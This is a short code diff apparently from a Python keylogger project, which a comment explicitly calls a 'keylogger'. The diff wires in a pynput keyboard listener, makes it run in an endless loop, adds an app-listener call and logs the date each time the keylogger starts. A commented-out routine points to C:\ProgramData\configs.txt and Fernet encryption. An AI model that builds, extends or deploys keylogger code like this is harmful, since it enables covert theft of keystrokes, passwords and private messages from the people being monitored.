@@ -2,7 +2,8 @@ from pynput.keyboard import Listener
 import threading
 import webbrowser
 from cryptography.fernet import Fernet
-from listener import on_press, writeLogs
+from listener import on_press, appListener
+from datetime import date
 
 #def encrypting(keyToDecrypt):
 #    f = open("C:\\ProgramData\\configs.txt", "a")
@@ -10,9 +11,18 @@ from listener import on_press, writeLogs
 #   f.close()
 
 def join():
+    appListener()
+
+    with open("file.txt", "a") as f:
+        dataToday = date.today()  # date of everytime keylogger is open
+        f.write(str(dataToday) + "\n")
+        f.close()
+        
     with Listener(on_press=on_press) as ls:
-        writeLogs(0)
-        ls.join()
+        while True:
+            ls.join()
+
+
 
 if __name__ == "__main__":
     try:
